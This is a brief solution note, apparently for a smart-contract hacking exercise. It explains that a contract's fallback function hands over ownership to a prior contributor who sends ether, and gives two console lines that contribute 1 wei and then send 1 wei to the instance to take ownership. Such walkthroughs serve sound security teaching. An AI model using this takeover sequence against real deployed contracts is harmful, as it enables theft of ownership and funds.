the fallback method will change ownership if sent some ether (and has previously contributed)

```
contract.contribute({ value: 1 });
sendTransaction({ from: player, to: instance, value: 1 });
```
